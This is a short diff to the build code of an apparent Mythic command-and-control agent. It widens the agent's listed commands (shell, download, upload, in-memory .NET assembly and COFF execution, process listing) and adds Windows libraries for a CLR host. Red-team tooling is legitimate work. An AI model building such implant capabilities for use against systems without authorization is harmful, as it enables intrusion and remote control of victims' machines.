@@ -84,7 +84,7 @@ var payloadDefinition = agentstructs.PayloadType{
 	Wrapper:                                false,
 	CanBeWrappedByTheFollowingPayloadTypes: []string{"service_wrapper"},
 	SupportsDynamicLoading:                 true,
-	Description:                            "multi-profile agent (http, mqtt, dns, msteams; shell/powershell/sleep/ls/download/upload/rm/mkdir/ps/kill/load/unload/exit; go or native C)",
+	Description:                            "multi-profile agent (http, mqtt, dns, msteams; shell/powershell/sleep/ls/download/upload/rm/mkdir/ps/kill/execute_assembly/execute_coff/whoami/env/pwd/cd/cp/mv/ipconfig/uptime/load/unload/exit; go or native C)",
 	SupportedC2Profiles:                    []string{"http", "mqtt", "dns", "msteams"},
 	MythicEncryptsData:                     true,
 	MessageFormat:                          agentstructs.MessageFormatJSON,
@@ -675,7 +675,10 @@ func build(msg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildRespon
 			}
 			args = append(args, "version.o")
 		}
-		args = append(args, "-lwinhttp", "-lbcrypt", "-liphlpapi", "-lws2_32", "-o", exe)
+		// ole32/oleaut32/shell32 serve the CLR host (COM, SAFEARRAY/BSTR,
+		// CommandLineToArgvW) and BeaconIsAdmin.
+		args = append(args, "-lwinhttp", "-lbcrypt", "-liphlpapi", "-lws2_32",
+			"-lole32", "-loleaut32", "-lshell32", "-o", exe)
 		cmd = exec.Command("zig", args...)
 		cmd.Dir = work
 	} else {
